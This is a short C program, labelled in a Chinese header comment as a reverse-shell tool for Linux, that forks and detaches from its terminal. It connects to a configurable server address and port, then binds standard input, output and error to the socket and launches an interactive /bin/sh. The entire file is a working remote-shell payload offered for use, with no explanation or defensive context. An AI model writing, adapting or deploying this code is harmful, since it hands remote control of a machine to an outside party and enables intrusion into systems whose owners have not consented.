/*
 * >  反弹shell C语言版
 * >  (支持ip和域名, Linux平台)
 * >　author: s0nnet
 * >  see <www.s0nnet.com>
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <arpa/inet.h>


int re_shell(){
    pid_t pid;
    if ((pid = fork()) == -1){
        exit(-1);
    }
    if (pid == 0) {

        setsid();
        char *host = "127.0.0.1"; //your server ip or domain
        int port = 8080; //conn port

        int sock;
        struct in_addr addr;
        struct hostent *h;
        struct sockaddr_in server;
        
        if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
            exit(-1);
        }

        server.sin_family = AF_INET;
        server.sin_port = htons(port);
       
        if(! inet_pton(AF_INET, host, &addr)){
            if((h = gethostbyname(host)) == NULL) {
                exit(-1);
            }
            host = inet_ntoa(*((struct in_addr *)h->h_addr));
        }

        server.sin_addr.s_addr = inet_addr(host);

        if(connect(sock, (struct sockaddr *)&server, sizeof(struct sockaddr)) == -1) {
            exit(-1);
        }
        
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);
        close(sock);
        execl("/bin/sh", "/bin/sh", "-i", NULL);
    }
    return 0;
}

int main()
{
    re_shell();
    return 0;
}
